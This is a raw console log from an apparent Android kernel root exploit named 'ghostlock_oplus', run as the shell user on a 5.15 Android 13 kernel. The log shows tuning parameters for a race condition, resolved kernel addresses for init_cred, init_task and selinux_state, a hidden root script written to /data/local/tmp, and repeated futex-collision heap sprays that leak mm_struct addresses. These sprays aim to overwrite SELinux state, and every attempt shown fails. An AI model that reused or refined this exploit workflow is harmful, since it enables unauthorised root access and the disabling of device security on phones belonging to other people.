[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[32m[+] [0mresolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/local/tmp script=/data/local/tmp/.ghostlock_root.sh
[33m[*] [0mdebug.execution.begin release=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mdebug.execution.recommended_cpus.main=0
[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
[33m[*] [0mdebug.execution.selected_cpus.main=0
[33m[*] [0mdebug.execution.selected_cpus.consumer=1
[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
[33m[*] [0mdebug.execution.race.route_wait_ms=1000
[33m[*] [0mdebug.execution.race.setup_settle_us=50000
[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
[33m[*] [0mdebug.execution.stages.w1_attempts=15
[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
[33m[*] [0mdebug.execution.stages.w2_attempts=15
[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
[33m[*] [0mdebug.execution.stages.w3_attempts=6
[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=0
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=0
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=0
[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=0
[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=0
[33m[*] [0mdebug.execution.routes.multicast_waiter.attempts=0
[33m[*] [0mdebug.execution.routes.multicast_waiter.arm_sequence=0
[33m[*] [0mdebug.execution.routes.multicast_waiter.arm_hold=0
[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
[33m[*] [0mdebug.execution.end
[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[33m[*] [0mroot script written path=/data/local/tmp/.ghostlock_root.sh bytes=6081
[33m[*] [0miomem cache: direct_map_end=ffffff8a80000000
[32m[+] [0mstartup context pid=5968 uid=2000 euid=2000 gid=2000 egid=2000 boot_ms=33974 attr=u:r:shell:s0 enforce=1
[32m[+] [0mstartup limits pid=5968 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=5968 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=5968 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[33m[*] [0m[T+0ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/1
[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[33m[*] [0m[T+65ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +279ms
[33m[*] [0m[spray] finding futex collisions... +556ms
[33m[*] [0m[spray] early collision screen 7/7 at 33%
[33m[*] [0m[spray] futex collisions found +1524ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8988ae8000 +1651ms
[33m[*] [0m[spray] payload ready +1654ms
[31m[-] [0mpage ffffff8988ae8000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 1/4 +1797ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +222ms
[33m[*] [0m[spray] finding futex collisions... +440ms
[33m[*] [0m[spray] early collision screen 13/7 at 31%
[33m[*] [0m[spray] futex collisions found +1402ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff898cf47400 +1543ms
[33m[*] [0m[spray] payload ready +1546ms
[31m[-] [0mpage ffffff898cf40000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 2/4 +3499ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +220ms
[33m[*] [0m[spray] finding futex collisions... +446ms
[33m[*] [0m[spray] early collision screen 11/7 at 31%
[33m[*] [0m[spray] futex collisions found +1403ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff898d3ed000 +1594ms
[33m[*] [0m[spray] payload ready +1596ms
[31m[-] [0mpage ffffff898d3e8000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 3/4 +5244ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +217ms
[33m[*] [0m[spray] finding futex collisions... +448ms
[33m[*] [0m[spray] early collision screen 12/7 at 31%
[33m[*] [0m[spray] futex collisions found +1402ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8985346000 +1577ms
[33m[*] [0m[spray] payload ready +1580ms
[31m[-] [0mpage ffffff8985340000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 4/4 +7006ms
[31m[-] [0m  heap spray failed
[31m[-] [0mW1: SELinux attempt 1 route failed; backing off
[31m[-] [0mWrite 1 failed
